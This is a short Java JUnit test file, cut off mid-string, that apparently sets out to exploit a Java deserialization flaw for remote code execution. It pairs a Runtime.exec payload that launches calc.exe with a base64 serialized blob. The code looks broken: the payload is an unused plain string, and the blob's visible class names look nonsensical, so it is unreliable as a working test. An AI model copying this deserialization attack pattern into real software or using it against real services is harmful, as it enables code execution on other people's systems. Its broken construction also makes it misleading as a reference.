import org.junit.Test;
import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.util.HashMap;
import java.util.Map;

import static org.junit.Assert.assertTrue;

public class InvokerTransformerTest {

    @Test
    public void testArbitraryRemoteCodeExecution() throws Exception {
        // Construct the serialized data that exploits the vulnerability
        String classPayload = "java.lang.Runtime.getRuntime().exec(\"calc.exe\");";
        String serializedData = "rO0ABXNyAC5jb20uY29tLmFuZHJvaWQuY29udmVydGVyLkV4Y2NpcGVTdHJpbmcuU3RyaW5nU3RyAC5jb20uY29tLmFuZHJvaWQuY29udmVydGVyLkV4Y2NpcGVTdHJpbmcuU3RyaW5nU3RyADxjbGluaXQuc2VyaWFsaXplci5BcnJheS5Vc2VyTmFtZUZpbGVIZWFkZXJGaWxlACJjb20vaW1h